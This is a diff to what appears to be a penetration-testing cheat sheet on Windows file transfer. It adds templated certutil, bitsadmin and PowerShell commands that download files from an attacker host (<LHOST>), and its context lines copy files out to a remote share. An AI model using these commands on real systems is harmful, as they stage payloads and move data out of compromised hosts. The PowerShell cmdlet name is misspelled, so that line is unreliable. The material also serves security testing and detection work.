@@ -41,3 +41,15 @@ xcopy \\<LHOST>\<SHARE_NAME>\<FILE_NAME> c:\windows\temp
 ```shell
 xcopy c:\windows\temp\test.txt \\<LHOST>\<SHARE_NAME>\test.txt
 ```
+## using `certutil.exe`
+```shell
+certutil -f -urlcache HTTP://<LHOST>:<LPORT>/<FILE_NAME> c:\windows\temp\<FILE_NAME>
+```
+## using bitsadmin
+```shell
+bitsadmin /transfer myDownloadJob /download /priority high http://<LHOST>:<LPORT>/<FILE> c:\windows\temp\<FILE_NAME>
+```
+## using powershell `Start-BitsTransfer`
+```powershell
+Start-BitsTrasnfer -Source "HTTP://<LHOST>:<LPORT>/<FILE_NAME>" -Destination c:\windows\temp\<FILE_NAME>
+```
